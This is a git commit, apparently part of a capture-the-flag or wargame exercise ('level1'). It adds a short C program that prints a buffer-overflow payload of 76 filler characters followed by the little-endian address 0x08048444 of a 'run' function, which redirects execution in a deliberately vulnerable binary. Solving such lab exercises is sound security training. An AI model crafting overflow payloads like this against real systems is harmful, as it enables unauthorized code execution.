36acea5639301bee9f00350816337b6cd4d5cd22
arthur6996 <arthuro6996@live.fr>
2022-04-07 15:46:44 +0200

    level1

---
+++ level1/Ressources/print.c
@@ -0,0 +1,7 @@
+#include <stdio.h>
+
+int main ()
+{
+	//76A and the address of run 0x08048444 but in little-endian
+    printf("aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08"); 
+}
